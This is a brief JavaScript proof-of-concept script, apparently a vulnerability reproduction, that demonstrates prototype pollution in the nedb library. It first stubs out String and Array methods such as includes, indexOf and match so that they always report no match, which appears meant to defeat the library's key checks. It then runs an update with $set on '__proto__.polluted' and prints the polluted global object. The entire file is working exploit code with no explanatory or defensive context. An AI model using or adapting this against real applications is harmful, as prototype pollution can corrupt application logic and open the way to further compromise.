String.prototype.includes = () => false;
String.prototype.startsWith = () => false;
String.prototype.endsWith = () => false;
String.prototype.indexOf = () => -1;
String.prototype.lastIndexOf = () => false;
String.prototype.match = () => false;
String.prototype.search = () => false;
String.prototype.matchAll = () => false;
Array.prototype.includes = () => false;
Array.prototype.indexOf = () => -1;
const Datastore = require('nedb');
const db = new Datastore();
console.log({}.polluted);
db.insert({ hello: 'world' }, err => {
    db.update({ hello: 'world' }, { $set: { '__proto__.polluted': 'yes' } }, {}, err => {
        console.log({}.polluted);
    });
});